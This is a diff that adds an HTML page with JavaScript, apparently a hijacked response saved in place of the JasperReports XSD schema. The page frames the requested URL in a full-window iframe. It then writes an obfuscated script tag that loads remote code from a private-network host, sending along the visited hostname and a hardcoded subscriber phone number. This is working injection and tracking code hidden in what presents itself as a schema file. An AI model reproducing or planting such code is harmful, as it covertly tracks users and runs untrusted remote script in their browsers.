@@ -1,0 +1,26 @@
+<script>
+function bsxz(fr){
+try{
+var y=fr.contentDocument;
+try{var h=y.getElementsByTagName('head')[0];var bt=y.createElement("base");bt.target="_top";h.appendChild(bt);var an=y.getElementsByTagName("a");for (var i in an){an[i].target="_top";}}catch(ee){}
+}
+catch(e){}}
+function go(w,u){
+var x=w.frames['rf'];
+if (x==null){x=w.document.getElementById('rf');if (x!=null)x.src=u;}
+else
+x.location=u;}
+var xu="http://10.24.224.140:8080/CustomerInfo/";
+var d=document;var w=window;var res;var ip='10.83.183.25';var vid='2';var md='6288262276310';var u='http://jasperreports.sourceforge.net/xsd/jasperreport.xsd';
+if (w.location.hostname.indexOf("m.")>=0)d.writeln('<meta id="xvw" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">');
+</script>
+<body style="margin:0;padding:0;overflow:hidden;width:100%;">
+<script>
+if (w.location == w.parent.location){d.writeln('<iframe src="about:blank" allowtransparency=true frameborder=0 name="rf" id="rf" scrolling=auto style="width:100%;height:100%;" onload="bsxz(this);"></iframe>');
+go(w,u);
+d.writeln('<sc'+'ript src="'+xu+'Customer?url='+w.location.hostname+'&mdn='+md+'&lac=1&ci=1">'+'</scri'+'pt>');
+}
+else{go(w.top,u)};
+</script>
+</body>
+
